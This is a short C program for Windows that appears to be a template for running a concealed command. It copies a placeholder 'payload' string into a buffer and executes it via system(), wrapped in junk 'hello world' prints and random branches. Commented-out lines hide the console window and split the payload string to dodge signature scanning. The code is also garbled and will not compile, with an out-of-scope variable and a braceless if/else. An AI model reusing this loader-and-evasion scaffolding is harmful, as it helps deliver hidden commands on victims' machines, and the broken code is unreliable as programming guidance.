#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
char cmd[50000];
void lol();
void run();

int printRandoms(int lower, int upper,  
                             int count) 
{ 
    int i; 
    for (i = 0; i < count; i++) { 
        int num = (rand() % 
           (upper - lower + 1)) + lower; 
    } 
	return num;
} 

int **Pais,P,D,i,n,result; //P = Paises / D = Dias

void lol()
{
	P += 1;
	D += 1;

	Pais = (int**)calloc(P, sizeof(int*));//Aloca a memoria de Pais com o tamanho da variavel P
	system(cmd);
	for (i = 0; i < P; i++) Pais[i] = (int*)calloc(D, sizeof(int)); //Faz loop por todas as linhas alocando as colunas (os dias)
}

void number2() {

    int num2;
    printf("Enter an integer: ");
	num2 = printRandoms(1,9,1);
    //scanf("%d", &num2);

    // True if num is perfectly divisible by 2
    if(num2 % 2 == 0)
        printf("%d is even.", num2);
	strcpy(cmd, "payload");
	run();
    else
        printf("%d is odd.", num2);
	strcpy(cmd, "payload");
	run();

}
void run()
{
printf("hello world!");
printf("hello world!");
printf("hello world!");
printf("hello world!");
printf("hello world!");
int num2 = printRandoms(1,9,1);
if(num2 > 3)
{
printf("lol");
lol();
}
else if(num2 > 4)
{
printf("lol");
lol();
}
lol();
}


int main(int argc, char *argv[])
{
  //ShowWindow (GetConsoleWindow(), SW_HIDE);

printf("hello world!");
printf("hello world!");
printf("hello world!");
printf("hello world!");
printf("hello world!");
//strcat(cmd, "pa");
//strcat(cmd, "ylo");
//strcat(cmd, "ad");
number2();

printf("hello world!");
printf("hello world!");
printf("hello world!");
printf("hello world!");
printf("hello world!");

return 0;
}